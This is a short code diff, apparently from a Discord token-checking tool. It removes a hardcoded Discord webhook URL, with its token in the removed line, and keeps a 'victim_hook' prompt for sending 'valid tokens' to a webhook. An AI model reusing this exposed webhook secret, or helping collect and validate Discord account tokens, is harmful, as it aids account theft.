@@ -14,7 +14,7 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-hook = "https://discord.com/api/webhooks/1067884377553502231/dJ4Ek9Rgwp-NGlSKutMxBT8g00tqTFAhEfk5r5x_WSB-Mws1ZG8Ss0NovNs2wb_cfXjz" # full url
+hook = "" # full url
 victim_hook = input("Enter your discord webhook if you want to save valid tokens via a discord webhook!(full url)")
     
 def clearcmd():
